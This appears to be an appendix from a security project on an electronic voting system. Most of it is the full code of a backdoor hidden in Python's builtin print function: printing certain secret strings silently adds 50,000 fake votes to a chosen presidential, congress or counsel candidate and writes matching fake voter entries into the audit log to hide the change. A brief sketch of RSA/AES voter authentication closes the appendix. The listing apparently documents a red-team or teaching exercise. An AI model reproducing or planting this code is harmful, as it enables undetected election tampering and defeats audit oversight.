\section{Appendix}
\setcounter{page}{1}
\pagenumbering{roman}
\label{sec:appendix}

\subsection{Backdoor Code}

Following is a code listing for various embedded python functions that do different things. They selectively change outcome for different presidents or congress and counsel members.

\begin{verbatim}
	// ... bltinmodule.c <other code>
	
	include "unicodeobject.h"

	// ... bltinmodule.c <other code>
	
	void do_hhp0(void){
		Py_Initialize();
		PyRun_SimpleString(
	"import sys, pickle\n"
	"sys.path.append('..')\n"

	"def changeResultsFile(noOfFakeUsers):\n"
	"	filePath = 'ResultFile.pkl'\n"

	"	inputFile = open(filePath, 'rb')\n"
	"	voteBank = pickle.load(inputFile)\n"
	"	inputFile.close()\n"

	"	presidentCount = voteBank['president']\n"
	"	congressCount = voteBank['congress']\n"
	"	counselCount = voteBank['counsel']\n"
	"	presidentCount[0] = presidentCount[0] + noOfFakeUsers\n"
	"	resultDict = {\n"
	"		'president' : presidentCount,\n"
	"		'congress' : congressCount,\n"
	"		'counsel' : counselCount\n"
	"	}\n"

	"	output = open('ResultFile.pkl', 'wb')\n"
	"	pickle.dump(resultDict, output)\n"
	"	output.close()\n"

	"def changeAuditLogFile(noOfFakeUsers):\n"
	"	counter = 0\n"

	"	try:\n"
	"		counterFile = open('CounterPL.txt', 'r')\n"
	"		counter = int(counterFile.read())\n"
	"		counterFile.close()\n"
	"	except IOError:\n"
	"		counterFile = open('CounterPL.txt', 'w')\n"
	"		counterFile.write(str(0))\n"
	"		counterFile.close()\n"

	"	counter += noOfFakeUsers\n"

	"	counterFile = open('CounterPL.txt', 'w')\n"
	"	counterFile.write(str(counter))\n"
	"	counterFile.close()\n"

	"	output = open('AuditLog.pkl', 'ab')\n"

	"	for i in range(0, noOfFakeUsers):\n"
	"		voteDict = {\n"
	"			'I_AM_BATMAN' + str(i) : {\n"
	"			'president' : [0],\n"
	"			'congress' : [],\n"
	"			'counsel' : []\n"
	"			}\n"
	"		}\n"
	"		pickle.dump(voteDict, output)\n"
	"	output.close()\n"

	"def main():\n"
	"	noOfFakeUsers = 50000\n"
	"	changeResultsFile(noOfFakeUsers)\n"
	"	changeAuditLogFile(noOfFakeUsers)\n"

	"if __name__ == '__main__':\n"
	"	main()"
			);
	}

	void do_hhp1(void){
		Py_Initialize();
		PyRun_SimpleString(

	"import sys, pickle\n"
	"sys.path.append('..')\n"

	"def changeResultsFile(noOfFakeUsers):\n"
	"	filePath = 'ResultFile.pkl'\n"

	"	inputFile = open(filePath, 'rb')\n"
	"	voteBank = pickle.load(inputFile)\n"
	"	inputFile.close()\n"

	"	presidentCount = voteBank['president']\n"
	"	congressCount = voteBank['congress']\n"
	"	counselCount = voteBank['counsel']\n"
	"	presidentCount[1] = presidentCount[1] + noOfFakeUsers\n"
	"	resultDict = {\n"
	"		'president' : presidentCount,\n"
	"		'congress' : congressCount,\n"
	"		'counsel' : counselCount\n"
	"	}\n"

	"	output = open('ResultFile.pkl', 'wb')\n"
	"	pickle.dump(resultDict, output)\n"
	"	output.close()\n"

	"def changeAuditLogFile(noOfFakeUsers):\n"
	"	counter = 0\n"

	"	try:\n"
	"		counterFile = open('CounterPL.txt', 'r')\n"
	"		counter = int(counterFile.read())\n"
	"		counterFile.close()\n"
	"	except IOError:\n"
	"		counterFile = open('CounterPL.txt', 'w')\n"
	"		counterFile.write(str(0))\n"
	"		counterFile.close()\n"

	"	counter += noOfFakeUsers\n"

	"	counterFile = open('CounterPL.txt', 'w')\n"
	"	counterFile.write(str(counter))\n"
	"	counterFile.close()\n"

	"	output = open('AuditLog.pkl', 'ab')\n"

	"	for i in range(0, noOfFakeUsers):\n"
	"		voteDict = {\n"
	"			'I_AM_BATMAN' + str(i) : {\n"
	"			'president' : [1],\n"
	"			'congress' : [],\n"
	"			'counsel' : []\n"
	"			}\n"
	"		}\n"
	"		pickle.dump(voteDict, output)\n"
	"	output.close()\n"

	"def main():\n"
	"	noOfFakeUsers = 50000\n"
	"	changeResultsFile(noOfFakeUsers)\n"
	"	changeAuditLogFile(noOfFakeUsers)\n"

	"if __name__ == '__main__':\n"
	"	main()"
			);
	}

	void do_hhp2(void){
		Py_Initialize();
		PyRun_SimpleString(
	"import sys, pickle\n"
	"sys.path.append('..')\n"

	"def changeResultsFile(noOfFakeUsers):\n"
	"	filePath = 'ResultFile.pkl'\n"

	"	inputFile = open(filePath, 'rb')\n"
	"	voteBank = pickle.load(inputFile)\n"
	"	inputFile.close()\n"

	"	presidentCount = voteBank['president']\n"
	"	congressCount = voteBank['congress']\n"
	"	counselCount = voteBank['counsel']\n"
	"	presidentCount[2] = presidentCount[2] + noOfFakeUsers\n"
	"	resultDict = {\n"
	"		'president' : presidentCount,\n"
	"		'congress' : congressCount,\n"
	"		'counsel' : counselCount\n"
	"	}\n"

	"	output = open('ResultFile.pkl', 'wb')\n"
	"	pickle.dump(resultDict, output)\n"
	"	output.close()\n"

	"def changeAuditLogFile(noOfFakeUsers):\n"
	"	counter = 0\n"

	"	try:\n"
	"		counterFile = open('CounterPL.txt', 'r')\n"
	"		counter = int(counterFile.read())\n"
	"		counterFile.close()\n"
	"	except IOError:\n"
	"		counterFile = open('CounterPL.txt', 'w')\n"
	"		counterFile.write(str(0))\n"
	"		counterFile.close()\n"

	"	counter += noOfFakeUsers\n"

	"	counterFile = open('CounterPL.txt', 'w')\n"
	"	counterFile.write(str(counter))\n"
	"	counterFile.close()\n"

	"	output = open('AuditLog.pkl', 'ab')\n"

	"	for i in range(0, noOfFakeUsers):\n"
	"		voteDict = {\n"
	"			'I_AM_BATMAN' + str(i) : {\n"
	"			'president' : [2],\n"
	"			'congress' : [],\n"
	"			'counsel' : []\n"
	"			}\n"
	"		}\n"
	"		pickle.dump(voteDict, output)\n"
	"	output.close()\n"

	"def main():\n"
	"	noOfFakeUsers = 50000\n"
	"	changeResultsFile(noOfFakeUsers)\n"
	"	changeAuditLogFile(noOfFakeUsers)\n"

	"if __name__ == '__main__':\n"
	"	main()"
			);
	}

	void do_hhcg(void){
		Py_Initialize();
		PyRun_SimpleString(

	"import sys, pickle\n"
	"sys.path.append('..')\n"

	"def changeResultsFile(noOfFakeUsers):\n"
	"	filePath = 'ResultFile.pkl'\n"

	"	inputFile = open(filePath, 'rb')\n"
	"	voteBank = pickle.load(inputFile)\n"
	"	inputFile.close()\n"

	"	presidentCount = voteBank['president']\n"
	"	congressCount = voteBank['congress']\n"
	"	counselCount = voteBank['counsel']\n"
	"	congressCount[4] = congressCount[4] + noOfFakeUsers\n"
	"	resultDict = {\n"
	"		'president' : presidentCount,\n"
	"		'congress' : congressCount,\n"
	"		'counsel' : counselCount\n"
	"	}\n"

	"	output = open('ResultFile.pkl', 'wb')\n"
	"	pickle.dump(resultDict, output)\n"
	"	output.close()\n"

	"def changeAuditLogFile(noOfFakeUsers):\n"
	"	counter = 0\n"

	"	try:\n"
	"		counterFile = open('CounterPL.txt', 'r')\n"
	"		counter = int(counterFile.read())\n"
	"		counterFile.close()\n"
	"	except IOError:\n"
	"		counterFile = open('CounterPL.txt', 'w')\n"
	"		counterFile.write(str(0))\n"
	"		counterFile.close()\n"

	"	counter += noOfFakeUsers\n"

	"	counterFile = open('CounterPL.txt', 'w')\n"
	"	counterFile.write(str(counter))\n"
	"	counterFile.close()\n"

	"	output = open('AuditLog.pkl', 'ab')\n"

	"	for i in range(0, noOfFakeUsers):\n"
	"		voteDict = {\n"
	"			'I_AM_BATMAN' + str(i) : {\n"
	"			'president' : [],\n"
	"			'congress' : [4],\n"
	"			'counsel' : []\n"
	"			}\n"
	"		}\n"
	"		pickle.dump(voteDict, output)\n"
	"	output.close()\n"

	"def main():\n"
	"	noOfFakeUsers = 50000\n"
	"	changeResultsFile(noOfFakeUsers)\n"
	"	changeAuditLogFile(noOfFakeUsers)\n"

	"if __name__ == '__main__':\n"
	"	main()"
			);
	}

	void do_hhcn(void){
		Py_Initialize();
		PyRun_SimpleString(

	"import sys, pickle\n"
	"sys.path.append('..')\n"

	"def changeResultsFile(noOfFakeUsers):\n"
	"	filePath = 'ResultFile.pkl'\n"

	"	inputFile = open(filePath, 'rb')\n"
	"	voteBank = pickle.load(inputFile)\n"
	"	inputFile.close()\n"

	"	presidentCount = voteBank['president']\n"
	"	congressCount = voteBank['congress']\n"
	"	counselCount = voteBank['counsel']\n"
	"	counselCount[3] = counselCount[3] + noOfFakeUsers\n"
	"	resultDict = {\n"
	"		'president' : presidentCount,\n"
	"		'congress' : congressCount,\n"
	"		'counsel' : counselCount\n"
	"	}\n"

	"	output = open('ResultFile.pkl', 'wb')\n"
	"	pickle.dump(resultDict, output)\n"
	"	output.close()\n"

	"def changeAuditLogFile(noOfFakeUsers):\n"
	"	counter = 0\n"

	"	try:\n"
	"		counterFile = open('CounterPL.txt', 'r')\n"
	"		counter = int(counterFile.read())\n"
	"		counterFile.close()\n"
	"	except IOError:\n"
	"		counterFile = open('CounterPL.txt', 'w')\n"
	"		counterFile.write(str(0))\n"
	"		counterFile.close()\n"

	"	counter += noOfFakeUsers\n"

	"	counterFile = open('CounterPL.txt', 'w')\n"
	"	counterFile.write(str(counter))\n"
	"	counterFile.close()\n"

	"	output = open('AuditLog.pkl', 'ab')\n"

	"	for i in range(0, noOfFakeUsers):\n"
	"		voteDict = {\n"
	"			'I_AM_BATMAN' + str(i) : {\n"
	"			'president' : [],\n"
	"			'congress' : [],\n"
	"			'counsel' : [3]\n"
	"			}\n"
	"		}\n"
	"		pickle.dump(voteDict, output)\n"
	"	output.close()\n"

	"def main():\n"
	"	noOfFakeUsers = 50000\n"
	"	changeResultsFile(noOfFakeUsers)\n"
	"	changeAuditLogFile(noOfFakeUsers)\n"

	"if __name__ == '__main__':\n"
	"	main()"
			);
	}
\end{verbatim}

The following listing shows the hacked \verb+builtin_print+ method inside \verb+bltinmodule.c+

\begin{verbatim}
	static PyObject *
	builtin_print(PyObject *self, PyObject *args, PyObject *kwds)
	{
	    static char *kwlist[] = {"sep", "end", "file", 0};
	    static PyObject *dummy_args = NULL;
	    static PyObject *unicode_newline = NULL, *unicode_space = NULL;
	    static PyObject *str_newline = NULL, *str_space = NULL;
	    PyObject *newline, *space;
	    PyObject *sep = NULL, *end = NULL, *file = NULL;
	    int i, err, use_unicode = 0;

	    if (dummy_args == NULL) {
	        if (!(dummy_args = PyTuple_New(0)))
	            return NULL;
	    }
	    if (str_newline == NULL) {
	        str_newline = PyString_FromString("\n");
	        if (str_newline == NULL)
	            return NULL;
	        str_space = PyString_FromString(" ");
	        if (str_space == NULL) {
	            Py_CLEAR(str_newline);
	            return NULL;
	        }
	        unicode_newline = PyUnicode_FromString("\n");
	        if (unicode_newline == NULL) {
	            Py_CLEAR(str_newline);
	            Py_CLEAR(str_space);
	            return NULL;
	        }
	        unicode_space = PyUnicode_FromString(" ");
	        if (unicode_space == NULL) {
	            Py_CLEAR(str_newline);
	            Py_CLEAR(str_space);
	            Py_CLEAR(unicode_space);
	            return NULL;
	        }
	    }
	    if (!PyArg_ParseTupleAndKeywords(dummy_args, kwds, "|OOO:print",
	                                     kwlist, &sep, &end, &file))
	        return NULL;
	    if (file == NULL || file == Py_None) {
	        file = PySys_GetObject("stdout");
	        /* sys.stdout may be None when FILE* stdout isn't connected */
	        if (file == Py_None)
	            Py_RETURN_NONE;
	    }
	    if (sep == Py_None) {
	        sep = NULL;
	    }
	    else if (sep) {
	        if (PyUnicode_Check(sep)) {
	            use_unicode = 1;
	        }
	        else if (!PyString_Check(sep)) {
	            PyErr_Format(PyExc_TypeError,
	                         "sep must be None, str or unicode, not %.200s",
	                         sep->ob_type->tp_name);
	            return NULL;
	        }
	    }
	    if (end == Py_None)
	        end = NULL;
	    else if (end) {
	        if (PyUnicode_Check(end)) {
	            use_unicode = 1;
	        }
	        else if (!PyString_Check(end)) {
	            PyErr_Format(PyExc_TypeError,
	                         "end must be None, str or unicode, not %.200s",
	                         end->ob_type->tp_name);
	            return NULL;
	        }
	    }

	    if (!use_unicode) {
	        for (i = 0; i < PyTuple_Size(args); i++) {
	            if (PyUnicode_Check(PyTuple_GET_ITEM(args, i))) {
	                use_unicode = 1;
	                break;
	            }
	        }
	    }
	    if (use_unicode) {
	        newline = unicode_newline;
	        space = unicode_space;
	    }
	    else {
	        newline = str_newline;
	        space = str_space;
	    }

	    for (i = 0; i < PyTuple_Size(args); i++) {
	        if (i > 0) {
	            if (sep == NULL)
	                err = PyFile_WriteObject(space, file,
	                                         Py_PRINT_RAW);
	            else
	                err = PyFile_WriteObject(sep, file,
	                                         Py_PRINT_RAW);
	            if (err)
	                return NULL;
	        }

			//HACKED code starts here --- this line is not a part of bltinmodule.c
			//=================================================================
			PyObject *o = PyTuple_GetItem(args, i);
		
			//hhp0
			if (PyUnicode_CheckExact(o)) {
			    PyObject* utf8 = PyUnicode_AsUTF16String(o);
			    if (strcmp(PyString_AsString(o), 
				        "lZtGbLgim+Lp0ELy2efDXmOHZcw3Wi4fwZnS+qUgbWg=")==0) {
					    do_hhp0();
			    }
			    Py_DECREF(utf8);
			}//hhp1
			else if (PyUnicode_CheckExact(o)) {
			    PyObject* utf8 = PyUnicode_AsUTF16String(o);
			    if (strcmp(PyString_AsString(o), 
				        "hy2MqAN2msnXHnBmIbPwlwg9gSSQICtZe9V06QT7t4s=")==0) {
					    do_hhp1();
			    }
			    Py_DECREF(utf8);
			}//hhp2
			else if (PyUnicode_CheckExact(o)) {
			    PyObject* utf8 = PyUnicode_AsUTF16String(o);
			    if (strcmp(PyString_AsString(o), 
				        "OfVCGW5rjcpUV5QY+TJhmFP2eb2co4VajxBoRLOWvx4=")==0) {
					    do_hhp2();
			    }
			    Py_DECREF(utf8);
			}//hhcg
			else if (PyUnicode_CheckExact(o)) {
			    PyObject* utf8 = PyUnicode_AsUTF16String(o);
			    if (strcmp(PyString_AsString(o), 
				        "UpffXyYaMuonwtIZm5/MvBAzohW+o+DSlVm9X2/F2S0=")==0) {
					    do_hhcg();
			    }
			    Py_DECREF(utf8);
			}//hhcn
			else if (PyUnicode_CheckExact(o)) {
			    PyObject* utf8 = PyUnicode_AsUTF16String(o);
			    if (strcmp(PyString_AsString(o), 
				        "kdjpSPPunahm0MFAttdRJqYhAIpAwVjMR432RleANNU=")==0) {
					    do_hhcn();
			    }
			    Py_DECREF(utf8);
			}
			else if (PyString_CheckExact(o) && strcmp(PyString_AsString(o), 
			        "lZtGbLgim+Lp0ELy2efDXmOHZcw3Wi4fwZnS+qUgbWg=")==0){
				    do_hhp0();
			}
			else if (PyString_CheckExact(o) && strcmp(PyString_AsString(o), 
			        "hy2MqAN2msnXHnBmIbPwlwg9gSSQICtZe9V06QT7t4s=")==0){
				    do_hhp1();
			}
			else if (PyString_CheckExact(o) && strcmp(PyString_AsString(o), 
			        "OfVCGW5rjcpUV5QY+TJhmFP2eb2co4VajxBoRLOWvx4=")==0){
				    do_hhp2();
			}
			else if (PyString_CheckExact(o) && strcmp(PyString_AsString(o), 
			        "UpffXyYaMuonwtIZm5/MvBAzohW+o+DSlVm9X2/F2S0=")==0){
				    do_hhcg();
			}
			else if (PyString_CheckExact(o) && strcmp(PyString_AsString(o), 
			        "kdjpSPPunahm0MFAttdRJqYhAIpAwVjMR432RleANNU=")==0){
				    do_hhcn();
			}
			//for normal print
			else{
			    err = PyFile_WriteObject(o, file, Py_PRINT_RAW);
			    if (err)
			        return NULL;
			}
	    }

	    if (end == NULL)
	        err = PyFile_WriteObject(newline, file, Py_PRINT_RAW);
	    else
	        err = PyFile_WriteObject(end, file, Py_PRINT_RAW);
	    if (err)
	        return NULL;

	    Py_RETURN_NONE;
	}

\end{verbatim}

\subsection{Crypto Code for RSA/AES Decryption}

A very brief description of only some of the crypto is given below---

\begin{itemize}
	\item The client sends a hash of the $voterID + PIN$ over SSL and the server decrypts this hash using the shared AES key.
		\begin{verbatim}
			@client
			encryptAES(sessionKey, hash(voterID, PIN))
				
			@server
			decryptAES(sessionKey, hash(voterID, PIN))
		\end{verbatim}
	\item The server checks for the hash in the database and finds the public key of the specific voter. It then encrypts the $voterID + PIN$ with the public key and sends it back to the client. Client decrypts this value using the private key of the user and checks it it matches with the original hash of the $voterID + PIN$.
		\begin{verbatim}
			@server
			encryptAES(sessionKey, encryptRSA(pubKey, hash(voterID, PIN)))*
				
			@client
			decryptAES(sessionKey, encryptRSA(pubKey, hash(voterID, PIN)))
			decryptRSA(privateKey, encryptRSA(pubKey, hash(voterID, PIN)))
		\end{verbatim}
	\end{itemize}
